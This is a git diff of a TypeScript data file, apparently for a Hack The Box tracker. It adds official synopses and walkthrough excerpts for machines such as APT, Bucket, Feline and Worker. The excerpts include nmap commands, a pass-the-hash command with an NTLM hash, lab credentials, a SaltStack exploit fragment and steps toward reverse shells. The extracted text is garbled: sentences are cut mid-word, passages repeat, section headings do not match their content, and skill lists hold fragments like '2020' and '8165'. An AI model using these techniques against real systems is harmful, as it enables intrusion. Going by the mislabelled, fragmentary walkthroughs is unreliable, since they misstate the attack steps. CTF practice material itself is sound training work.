JSON Object we have an iv (initialization vector), which is randomly generated data.\n\n### 👑 Privilege Escalation\nusing sudo , which we can leverage in order to escalate our privileges. Skills Required Web Enumeration Linux Enumeration Skills Learned Laravel Token Deserialization Composer pam_tty_audit Enumeration Nmap reveals that an OpenSSH Server is running at port 22 and the banner reveals that this is a Ubuntu Linux server. An Apache server is running at port 80 hosting a site with the title \"Hack The Box Academy\". We also have a MySQL server running on port 33060. Let's enumerate the website on port 80. This redirects us to http://academy.htb, lets add it to our host file. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-apt",
@@ -7568,10 +8665,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/apt",
     "writeupUrl": "https://0xdf.gitlab.io/tags#apt",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "APT is an insane difficulty Windows machine where RPC and HTTP services are only exposed.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-10-31T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "APT is an insane difficulty Windows machine where RPC and HTTP services are only exposed.",
+    "officialPdf": "296-APT_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAPT is an insane difficulty Windows machine where RPC and HTTP services are only exposed.\n\n### ⚔️ Foothold Vector\nThis user doesn't seem to have access to any special shares or files so we are going to try login via WinRM. However, the login is not successful and we fail to establish a session. Another resource worth enumerating though is the registry. It is possible to access registry remotely with the valid credentials we have obtained. When a user logs in, their registry hive is mounted to HKCU , which is unique to each user. However, user hives can also be accessed via the HKEY_USERS (HKU) hive. This stores registry entries for all users on the system. Impacket's reg.py can be used to enumerate the registry. The query is successful and we're able to list the subkeys in HKU.\n\n### 👑 Privilege Escalation\n@localhost -N grep 'henry.vinson' hashes.ntds cme smb localhost -d htb.local -u henry.vinson -H 2de80758521541d19cabba480b260e8f cut -d ':' -f 4 hashes.txt.ntds > hashes.txt cme smb localhost -d htb.local -u henry.vinson -H hashes.txt However, we notice that the server locks out our tries after a few attempts. This means that there's some rate limit in place to prevent SMB bruteforce attacks. We are going to change our method and try to bruteforce the hashes over Kerberos. Kerbrute doesn't support bruteforcing hashes, but we can use pyKerbrute. The script can check a single hash only. Let's modify it to test hashes from a list. Clone the repo and replace the main method in ADPwdSpray."
   },
   {
     "id": "htb-bucket",
@@ -7582,15 +8682,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "DynamoDB",
+      "HTB",
+      "PD4ML"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bucket",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bucket",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Bucket is a medium difficulty Linux machine that features LocalStack which simulates a local AWS environment. Web application is running on Apache server and the files are hosted on an open S3 bucket which allows us dropping a malicious PHP file and thus gain a reverse shell.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-10-17T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Bucket is a medium difficulty Linux machine that features LocalStack which simulates a local AWS environment. Web application is running on Apache server and the files are hosted on an open S3 bucket which allows us dropping a malicious PHP file and thus gain a reverse shell. At user's home directory we can find an unfinished project which utilizes DynamoDB for database. Enumerating DynamoDB reveals credentials which can be reused to move laterally. An internal application found to be running as root, which is exploited to gain root access.",
+    "skillsLearned": [
+      "DynamoDB",
+      "PD4ML"
+    ],
+    "officialPdf": "283-Bucket_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBucket is a medium difficulty Linux machine that features LocalStack which simulates a local AWS environment. Web application is running on Apache server and the files are hosted on an open S3 bucket which allows us dropping a malicious PHP file and thus gain a reverse shell. At user's home directory we can find an unfinished project which utilizes DynamoDB for database. Enumerating DynamoDB reveals credentials which can be reused to move laterally. An internal application found to be running as root, which is exploited to gain root access.\n\n### 🎯 Core Skills\n- **DynamoDB**\n- **PD4ML**\n\n### ⚔️ Foothold Vector\nEnumeration Nmap output reveals that the target server has ports 22 (OpenSSH) and 80 (Apache httpd) open. Apache Let's browse to port 80. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.212 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC 10.10.10.212 Apache service is redirecting us to bucket.htb domain. Let's add below entry to resolve the domain to the server IP address. We can now browse to http://bucket.htb . This domain is hosting an advertising platform application but images of the application fail to load. Lets view the page source. The images of the application are loading from the adserver folder of a subdomain of bucket.htb .\n\n### 👑 Privilege Escalation\n, which is exploited to gain root access. Skills Required Enumeration Basic Knowledge of Linux Skills Learned S3 DynamoDB PD4ML Exploitation Enumeration Nmap output reveals that the target server has ports 22 (OpenSSH) and 80 (Apache httpd) open. Apache Let's browse to port 80. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.212 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC 10.10.10.212 Apache service is redirecting us to bucket.htb domain. Let's add below entry to resolve the domain to the server IP address. We can now browse to http://bucket.htb . This domain is hosting an advertising platform application but images of the application fail to load."
   },
   {
     "id": "htb-jewel",
@@ -7601,15 +8710,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "2020",
+      "8165",
+      "CVE-2020-8165",
+      "HTB",
+      "Source-Code-Analysis"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/jewel",
     "writeupUrl": "https://0xdf.gitlab.io/tags#jewel",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Jewel is a medium difficulty Linux machine that features source code analysis of a Ruby on Rails web application. This reveals an unsafe use of RedisCacheStore (CVE-2020-8165), which is leveraged to get RCE.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-10-10T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Jewel is a medium difficulty Linux machine that features source code analysis of a Ruby on Rails web application. This reveals an unsafe use of RedisCacheStore (CVE-2020-8165), which is leveraged to get RCE. After archiving a foothold, we get command execution in the context of the unprivileged user bill . This user is allowed to run the gem command as root, but requires two- factor authentication to do so. In order to get around 2FA, we search for and find bill's password, and can then use the Google Authenticator utility to generate an OTP for sudo, in order to execute commands as root.",
+    "skillsLearned": [
+      "Source Code Analysis",
+      "2020",
+      "8165"
+    ],
+    "officialPdf": "282-Jewel_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nJewel is a medium difficulty Linux machine that features source code analysis of a Ruby on Rails web application. This reveals an unsafe use of RedisCacheStore (CVE-2020-8165), which is leveraged to get RCE. After archiving a foothold, we get command execution in the context of the unprivileged user bill . This user is allowed to run the gem command as root, but requires two- factor authentication to do so. In order to get around 2FA, we search for and find bill's password, and can then use the Google Authenticator utility to generate an OTP for sudo, in order to execute commands as root.\n\n### 🎯 Core Skills\n- **Source Code Analysis**\n- **2020**\n- **8165**\n\n### 🛡️ Associated CVEs\n`CVE-2020-8165`\n\n### ⚔️ Foothold Vector\n, we get command execution in the context of the unprivileged user bill . This user is allowed to run the gem command as\n\n### 👑 Privilege Escalation\n, but requires two- factor authentication to do so. In order to get around 2FA, we search for and find bill's password, and can then use the Google Authenticator utility to generate an OTP for sudo, in order to execute commands as root. Skills Required OWASP Top 10 Basic Linux Enumeration Skills Learned Source Code Analysis CVE-2020-8165 Exploitation Sudo Abuse Enumeration Nmap Let's begin by running an Nmap scan. From the Nmap output we see a GitWeb service running on port 8000, and a Phusion Passenger site on port 8080. On visiting http://10.10.10.211:8000/gitweb/ we get access to a git repo with the description BLOG! ports=$(nmap -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-reel2",
@@ -7620,15 +8741,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "JEA-Bypass",
+      "Password-Cracking",
+      "Phishing",
+      "Sticky-Notes"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/reel2",
     "writeupUrl": "https://0xdf.gitlab.io/tags#reel2",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Reel2 is a Hard difficulty Windows machine that features an open source Social Networking application, which allows us to find usernames. Outlook Web Access access can be gained by performing a password spraying attack the OWA endpoint.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-10-03T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Reel2 is a Hard difficulty Windows machine that features an open source Social Networking application, which allows us to find usernames. Outlook Web Access access can be gained by performing a password spraying attack the OWA endpoint. A password hash can be captured and cracked by performing a spear phishing attack, which allows us to gain a foothold on the server. Using PowerShell functions, JEA restrictions can be bypassed. Enumerating stickynotes processes reveals a set of credentials which can be used to move laterally.",
+    "skillsLearned": [
+      "Phishing",
+      "Password Cracking",
+      "JEA Bypass",
+      "Sticky Notes"
+    ],
+    "officialPdf": "281-Reel2_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nReel2 is a Hard difficulty Windows machine that features an open source Social Networking application, which allows us to find usernames. Outlook Web Access access can be gained by performing a password spraying attack the OWA endpoint. A password hash can be captured and cracked by performing a spear phishing attack, which allows us to gain a foothold on the server. Using PowerShell functions, JEA restrictions can be bypassed. Enumerating stickynotes processes reveals a set of credentials which can be used to move laterally.\n\n### 🎯 Core Skills\n- **Phishing**\n- **Password Cracking**\n- **JEA Bypass**\n- **Sticky Notes**\n\n### ⚔️ Foothold Vector\non the server. Using PowerShell functions, JEA restrictions can be bypassed. Enumerating stickynotes processes reveals a set of credentials which can be used to move laterally. Exploiting a vulnerable JEA function allows us to read files as the administrator. Skills Required Enumeration Basic Knowledge of Windows Scripting Skills Learned Phishing Password Cracking JEA Bypass Sticky Notes Enumeration Enumeration Let's start by running a Nmap scan. The scan reveals many ports open, including port 80 (HTTP), 443 (HTTPS), 5985 (WinRM) and 8080 (HTTP). Let's browse to to the IIS (Internet Information Services) installation on port 80. We're presented with an access denied message.\n\n### 👑 Privilege Escalation\naccess. By default, JEA starts a session in NoLanguage mode which restricts the execution of cmdlets, functions and other PowerShell language elements. However, when configuring JEA, it is also possible to change the language mode. Let's check the language mode of our session. It's in ConstrainedLanguage mode. The official documentation states that this mode allows all PowerShell scripting elements. We can break out of the JEA restriction by creating a function. This is successful and we see the output of the whoami command. We can also use a script block to bypass this restriction. Let's download nc.exe to the machine."
   },
   {
     "id": "htb-doctor",
@@ -7644,10 +8778,17 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/doctor",
     "writeupUrl": "https://0xdf.gitlab.io/tags#doctor",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Doctor is an easy machine that features an Apache server running on port 80. Users can identify a virtual host on the main webpage, and after adding it to their hosts file, acquire access to the Doctor Messaging System .",
     "timeSpentSeconds": 0,
     "createdAt": "2020-09-26T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Doctor is an easy machine that features an Apache server running on port 80. Users can identify a virtual host on the main webpage, and after adding it to their hosts file, acquire access to the Doctor Messaging System . The system is found to be vulnerable to Server Side Template Injection, and successful exploitation of the vulnerability results in a shell as the user web . This user belongs to the adm group and is able to read various system logs.",
+    "skillsLearned": [
+      "Identifying a Server Side Template Injection",
+      "Exploiting an SSTI to get Remote Code Execution"
+    ],
+    "officialPdf": "278-Doctor_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nDoctor is an easy machine that features an Apache server running on port 80. Users can identify a virtual host on the main webpage, and after adding it to their hosts file, acquire access to the Doctor Messaging System . The system is found to be vulnerable to Server Side Template Injection, and successful exploitation of the vulnerability results in a shell as the user web . This user belongs to the adm group and is able to read various system logs.\n\n### 🎯 Core Skills\n- **Identifying a Server Side Template Injection**\n- **Exploiting an SSTI to get Remote Code Execution**\n\n### ⚔️ Foothold Vector\nof the vulnerability results in a shell as the user web . This user belongs to the adm group and is able to read various system logs. Enumeration of the logs reveals a misplaced password that can be used to login as the user shaun . Enumeration of system services reveals that a Splunk Universal Forwarder is running on port 8089, in the context of\n\n### 👑 Privilege Escalation\n. Research reveals an exploit that can be used with valid credentials in order to execute code remotely and escalate our privileges. Skills Required Enumeration Skills Learned Identifying a Server Side Template Injection Exploiting an SSTI to get Remote Code Execution Log Enumeration for Passwords Exploiting the Splunk Universal Forwarder Enumeration Nmap Let's begin by running an Nmap scan. The scan reveals that ports 22 (SSH), 80 (Apache) and 8089 (Splunk) are open. A Google search for the keywords splunk port 8089 reveals this issue in the official Splunk forums, which reveals that a Splunk Universal Forwarder is listening on the specified port."
   },
   {
     "id": "htb-crossfit",
@@ -7658,15 +8799,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
+      "Blind-XSS",
+      "COR's-(Cross",
+      "CVE-2019-10774",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/crossfit",
     "writeupUrl": "https://0xdf.gitlab.io/tags#crossfit",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "CrossFit is an insane difficulty Linux box featuring an Apache server that hosts the website of a fictional \"CrossFit Club\" gym. The website makes use of an XSS prevention mechanism that logs IP addresses and User-Agents of detected XSS attempts.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-09-19T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "CrossFit is an insane difficulty Linux box featuring an Apache server that hosts the website of a fictional \"CrossFit Club\" gym. The website makes use of an XSS prevention mechanism that logs IP addresses and User-Agents of detected XSS attempts. The log is displayed on a web page that is periodically visited by an admin, can be used as the source of Blind XSS. CORS is used to enumerate subdomains that accept cross-origin resources by sending Origin headers and looking for Access-Control-Allow-Origin response headers.",
+    "skillsLearned": [
+      "Blind XSS",
+      "COR's (Cross",
+      "Origin Resource Sharing) Misconfiguration and"
+    ],
+    "officialPdf": "277-CrossFit_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCrossFit is an insane difficulty Linux box featuring an Apache server that hosts the website of a fictional \"CrossFit Club\" gym. The website makes use of an XSS prevention mechanism that logs IP addresses and User-Agents of detected XSS attempts. The log is displayed on a web page that is periodically visited by an admin, can be used as the source of Blind XSS. CORS is used to enumerate subdomains that accept cross-origin resources by sending Origin headers and looking for Access-Control-Allow-Origin response headers.\n\n### 🎯 Core Skills\n- **Blind XSS**\n- **COR's (Cross**\n- **Origin Resource Sharing) Misconfiguration and**\n\n### 🛡️ Associated CVEs\n`CVE-2019-10774`\n\n### ⚔️ Foothold Vector\nCode Review PAM Password Reuse & Cracking Code Disassembly Enumeration Rustscan output shows that SSH, Apache and FTP are available on their default ports. The FTP server is configured to use SSL/TLS. Let's inspect the TLS certificate: The certificate CN, also known as a common name, is set as the value *.crossfit.htb , whereas the associated email address uses the gym-club.crossfit.htb subdomain. We take a note of this domain as it might be of use later. Let's navigate to port 80 using a browser to check out the webpage at http://10.10.10.208/ . We are presented with the default Apache/Debian page. rustscan -a 10.10.10.208 --ulimit 10000 openssl s_client -connect 10.10.10.\n\n### 👑 Privilege Escalation\n. By symlinking arbitrary files to /root/.ssh/authorized_keys before the program runs, and writing a user-generated public key to the database that will then be written to the authorized_keys file, we gain SSH access to the system as root. Skills Required Enumeration Forensic Knowledge Code Review XSS (Cross Site Scripting) CSRF (Cross-Site Request Forgery) CORS (Cross-Origin Resource Sharing) Basic Reverse Engineering Skills Learned Blind XSS COR's (Cross-Origin Resource Sharing) Misconfiguration and Exploitation Code Review PAM Password Reuse & Cracking Code Disassembly Enumeration Rustscan output shows that SSH, Apache and FTP are available on their default ports."
   },
   {
     "id": "htb-compromised",
@@ -7677,15 +8829,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2018-12256",
+      "HTB",
+      "LiteCart-2.1.2"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/compromised",
     "writeupUrl": "https://0xdf.gitlab.io/tags#compromised",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Compromised is a hard Linux machine that features an Apache web server running on port 80. The web server features a LiteCart installation, and",
     "timeSpentSeconds": 0,
     "createdAt": "2020-09-12T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Compromised is a hard Linux machine that features an Apache web server running on port 80. The web server features a LiteCart installation, and",
+    "skillsLearned": [
+      "LiteCart 2.1.2"
+    ],
+    "officialPdf": "276-Compromised_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCompromised is a hard Linux machine that features an Apache web server running on port 80. The web server features a LiteCart installation, and\n\n### 🎯 Core Skills\n- **LiteCart 2.1.2**\n\n### 🛡️ Associated CVEs\n`CVE-2018-12256`\n\n### ⚔️ Foothold Vector\nPHP Disabled Globals Bypass File Modification Timestamp enumeration Forensic Analysis of Linux Systems Code Disassembly Enumeration Nmap Let's begin by running an Nmap scan. The scan reveals that ports 22 (SSH) and 80 (Apache) are open. Apache The Apache server on port 80 can be accessed from a browser. The server is running LiteCart , an e-commerce platform written in PHP that can be used to sell various products online. This specific installation of the platform is selling rubber ducks in various colours. The page also features a Sign In button. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.207 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.\n\n### 👑 Privilege Escalation\naccount, users must undertake a forensic analysis of the affected system, which reveals that two rootkits are installed. The first is a shared library called libdate.so , which has been set to execute during read system calls using LD_PRELOAD. The second is a malicious pam_unix.so , which was used to replace the original file of the same name, and is called every time an authentication request is made. Both of these files contain hardcoded master keys that once inputted, allow users to escalate to the root account. Skills Required Enumeration Forensic Knowledge Code Review Bypassing Restricted Environments Log File Analysis Skills Learned LiteCart 2.1."
   },
   {
     "id": "htb-passage",
@@ -7696,15 +8856,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Basic-Web",
+      "CVE-2019-11447",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/passage",
     "writeupUrl": "https://0xdf.gitlab.io/tags#passage",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Passage is a medium difficulty Linux machine that hosts a CuteNews web application. This is found to suffer from a remote command execution vulnerability, which is leveraged to gain a foothold.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-09-05T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Passage is a medium difficulty Linux machine that hosts a CuteNews web application. This is found to suffer from a remote command execution vulnerability, which is leveraged to gain a foothold. A CuteNews password hash for the application user paul is discovered and cracked. Owing to password reuse, we can use this to move laterally to the paul system user. A private SSH key is found to be shared between the system users, which allows us to move laterally to nadav . This user is found to be a member of the sudo group.",
+    "skillsLearned": [
+      "Basic Web"
+    ],
+    "officialPdf": "275-Passage_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPassage is a medium difficulty Linux machine that hosts a CuteNews web application. This is found to suffer from a remote command execution vulnerability, which is leveraged to gain a foothold. A CuteNews password hash for the application user paul is discovered and cracked. Owing to password reuse, we can use this to move laterally to the paul system user. A private SSH key is found to be shared between the system users, which allows us to move laterally to nadav . This user is found to be a member of the sudo group.\n\n### 🎯 Core Skills\n- **Basic Web**\n\n### 🛡️ Associated CVEs\n`CVE-2019-11447`\n\n### ⚔️ Foothold Vector\n. A CuteNews password hash for the application user paul is discovered and cracked. Owing to password reuse, we can use this to move laterally to the paul system user. A private SSH key is found to be shared between the system users, which allows us to move laterally to nadav . This user is found to be a member of the sudo group. Enumeration of the vim command line history reveals that the com.ubuntu.USBCreator.conf policy has been edited, in order to allow users of the sudo group to invoke methods of the usb-creator service. The D-Bus service USBCreator is found to suffer from a vulnerability, allowing the password security policy imposed by sudo binary to be bypassed.\n\n### 👑 Privilege Escalation\n. Skills Required Web Enumeration Windows Enumeration Skills Learned Basic Web Exploitation D-Bus Service Exploitation Enumeration Nmap output reveals an Apache server and a SSH server running on their default ports. The website title is named \"Passage News\". Let's browse on port 80 using our web browser. The page displays updates regarding the state of the host. We also notice on hovering over the author names that their email addresses are displayed. We can see this better if we inspect the web page source code. Hit CTRL + U to display the source code. ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-feline",
@@ -7715,15 +8883,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2020-11651",
+      "CVE-2020-11652",
+      "CVE-2020-9484",
+      "Deserialization",
+      "HTB",
+      "Session-Persistence",
+      "Unix-Socket"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/feline",
     "writeupUrl": "https://0xdf.gitlab.io/tags#feline",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Feline is a hard difficulty Linux machine that features an Apache Tomcat installation. This hosts a Java application that allows users to upload files of any type.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-08-29T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Feline is a hard difficulty Linux machine that features an Apache Tomcat installation. This hosts a Java application that allows users to upload files of any type. The version of Tomcat 9.0.35 is found vulnerable to RCE via session persistence. After uploading a malicious session file and triggering it, we get a foothold as the Tomcat user.",
+    "skillsLearned": [
+      "Session Persistence",
+      "Unix Socket",
+      "Deserialization"
+    ],
+    "officialPdf": "274-Feline_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFeline is a hard difficulty Linux machine that features an Apache Tomcat installation. This hosts a Java application that allows users to upload files of any type. The version of Tomcat 9.0.35 is found vulnerable to RCE via session persistence. After uploading a malicious session file and triggering it, we get a foothold as the Tomcat user.\n\n### 🎯 Core Skills\n- **Session Persistence**\n- **Unix Socket**\n- **Deserialization**\n\n### 🛡️ Associated CVEs\n`CVE-2020-11651`, `CVE-2020-11652`, `CVE-2020-9484`\n\n### ⚔️ Foothold Vector\nas the Tomcat user. Enumeration reveals that SaltStack is running locally, which suffers from authentication bypass and directory traversal vulnerabilities, leading to RCE. We take advantage of an exposed Docker unix socket file in order to interact with Docker API and escape the container. Skills Required Web Enumeration Networking Skills Learned Session Persistence Unix Socket Deserialization Enumeration Nmap reveals SSH on its default port and an Apache Tomcat instance on port 8080. It also reveals the the version of Apache Tomcat is 9.0.27. According to the Apache Tomcat changelog, version 9.0.35 and below suffer from a RCE vulnerability via session persistence (CVE-2020-9484).\n\n### 👑 Privilege Escalation\n', 'log_level': 'debug', 'master_ip': master_ip, 'master_port': master_port, 'auth_timeout': 5, 'auth_tries': 1, 'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port) } return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear') The pwn_exec function is sending the data to be executed, in this case it's using Python. Now that we know what the script does, we can go ahead and install the dependencies and run it. def check_connection(master_ip, master_port, channel): print(\"[+] Checking salt-master ({}:{}) status... \".format(master_ip, master_port), end='') sys.stdout.flush() # connection check try: channel.send({'cmd':'ping'}, timeout=2) except salt.exceptions."
   },
   {
     "id": "htb-omni",
@@ -7734,15 +8916,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Windows-IoT-Core"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/omni",
     "writeupUrl": "https://0xdf.gitlab.io/tags#omni",
-    "hint": "Hack The Box Other machine. Rated Easy difficulty.",
+    "hint": "Omni is an easy difficulty Windows IoT Core machine. Network",
     "timeSpentSeconds": 0,
     "createdAt": "2020-08-22T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Omni is an easy difficulty Windows IoT Core machine. Network",
+    "skillsLearned": [
+      "Windows IoT Core"
+    ],
+    "officialPdf": "271-Omni_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOmni is an easy difficulty Windows IoT Core machine. Network\n\n### 🎯 Core Skills\n- **Windows IoT Core**\n\n### ⚔️ Foothold Vector\nRegistry Hive Hash Retrieval & Cracking Powershell Credentials Enumeration Enumeration Nmap reveals that this is a Windows machine running WinRM on the default port 5985, and an HTTP server on port 8080. The name of the HTTP basic realm on port 8080 is Windows Device Portal . Access to port 8080 from the web browser is restricted by basic authentication. Searching for Windows Device Portal online reveals that this is a web application that allows for remote management of Windows IoT devices. ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.204 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -Pn -sC -sV 10.10.10.\n\n### 👑 Privilege Escalation\n.txt. Skills Required Web Enumeration Windows Enumeration Skills Learned Windows IoT Core Exploitation Registry Hive Hash Retrieval & Cracking Powershell Credentials Enumeration Enumeration Nmap reveals that this is a Windows machine running WinRM on the default port 5985, and an HTTP server on port 8080. The name of the HTTP basic realm on port 8080 is Windows Device Portal . Access to port 8080 from the web browser is restricted by basic authentication. Searching for Windows Device Portal online reveals that this is a web application that allows for remote management of Windows IoT devices. ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-worker",
@@ -7753,15 +8942,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Azure-DevOps",
+      "HTB",
+      "OWASP-Top-10",
+      "SVN-Repository"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/worker",
     "writeupUrl": "https://0xdf.gitlab.io/tags#worker",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Worker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then moves to a local Azure DevOps installation, which can be abused to gain a foothold and escalate privil",
     "timeSpentSeconds": 0,
     "createdAt": "2020-08-15T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Worker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then moves to a local Azure DevOps installation, which can be abused to gain a foothold and escalate privileges.",
+    "skillsLearned": [
+      "Azure DevOps",
+      "SVN Repository",
+      "OWASP Top 10"
+    ],
+    "officialPdf": "270-Worker_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nWorker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then moves to a local Azure DevOps installation, which can be abused to gain a foothold and escalate privileges.\n\n### 🎯 Core Skills\n- **Azure DevOps**\n- **SVN Repository**\n- **OWASP Top 10**\n\n### ⚔️ Foothold Vector\nand escalate privileges. Skills Required OWASP Top 10 Skills Learned Azure DevOps SVN Repository OWASP Top 10 Enumeration Nmap output shows that web (IIS), WinRM, and Subversion (svnserve) services are running on the box. On visiting port 80 we see the default IIS installation page. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.203 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -sC -sV -p$ports 10.10.10.203 The availability of port 3690 indicates that an SVN repository is available. We can attempt to interact with it and download files using the svn command. We can issue the command svn checkout svn://10.10.10.203 to download the available files to our local machine.\n\n### 👑 Privilege Escalation\nThere don't seem to be any common privilege escalation paths, so let's return to the Azure DevOps service. Logout from the DevOps portal as nathen , and login using robisl / wolves11 . After signing in we see that we have access to a new project called PartsUnlimited . After some enumeration inside this project we see that user robisl is a member of the \"Build Administrators\" group. This is interesting since Build Administrators have full control over the pipelines in the project. This means that we can create new build definitions to execute arbitrary commands."
   },
   {
     "id": "htb-laser",
@@ -7772,15 +8972,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Printer"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/laser",
     "writeupUrl": "https://0xdf.gitlab.io/tags#laser",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
